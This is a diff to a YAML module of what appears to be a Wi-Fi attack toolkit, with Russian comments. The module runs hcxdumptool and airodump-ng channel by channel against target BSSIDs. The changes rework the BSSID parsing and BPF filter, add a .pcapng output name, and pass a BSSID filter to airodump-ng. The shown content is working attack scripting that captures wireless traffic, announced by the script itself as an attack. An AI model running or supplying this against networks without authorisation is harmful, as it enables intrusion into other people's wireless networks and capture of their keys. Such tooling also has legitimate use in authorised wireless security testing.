@@ -1,6 +1,8 @@
 description: |-
   Запускает hxcdumptool и airodump на канале по таймауту.
   
+  С двумя адаптерами перехват надежнее.
+
 author: vinzekatze
 
 tags:
@@ -48,23 +50,17 @@ mode:
     - b
     - c
   format:
-    b: >-
-      wlan addr3 {}
+    b: '--bssid {!r}'
     i: '{!r}'
     m: '{!r}'
     c: '{!r}'
     t: '{}s'
-  join:
-    b: ' or '
-  pformat:
-    b: '{!r}'
 
 script: |-
   interface=#hcx-wlan#;
   monitor=#mon-wlan#;
   outdir=#dir#;
   OLDIFS=$IFS;
-  targs=#bssid#;
 
   # Проверки
   iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
@@ -74,12 +70,16 @@ script: |-
   stop_mon_screen() { sudo screen -S pulsar-dump-monitor-proc -X stuff '^C'; };
   exit_func() { stop_mon_screen; rm -f ./temp.targets-filter.bpf; exit; };
 
-  hcxdumptool --bpfc="($targs)" > temp.targets-filter.bpf;
+  # Подготовка
+  bssids=$(echo #bssid# | grep -oE '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | tr '\n' ' ');
+  filter_rule=$(echo "$bssids" | sed 's/ / or wlan addr3 /g; s/^/wlan addr3 /')
+  hcxdumptool --bpfc="($filter_rule)" > temp.targets-filter.bpf;
   mkdir -p $outdir;
+
   while true; do
     for chn in #channels#; do
       # Параметры
-      hcxsfile=$(realpath $outdir/hcxdump-c${chn}-$(date +%Y%m%d%H%M%S));
+      hcxsfile=$(realpath $outdir/hcxdump-c${chn}-$(date +%Y%m%d%H%M%S).pcapng);
       monhsfile=$(realpath $outdir/mondump-c${chn}-$(date +%Y%m%d%H%M%S));
       
       # Мониторинг
@@ -89,7 +89,7 @@ script: |-
       sudo ip link set $monitor down;
       sudo iw $monitor set monitor control;
       sudo ip link set $monitor up;
-      sudo screen -dmS pulsar-dump-monitor-proc airodump-ng $monitor -c $chn --write $monhsfile --output-format pcap;
+      sudo screen -dmS pulsar-dump-monitor-proc airodump-ng $monitor -c $chn --write $monhsfile --output-format pcap #bssid#;
 
       # hxcdumptool
       echo -e "\e[1;92m[$interface] Starting attack with hcxdumptool... \e[0m";
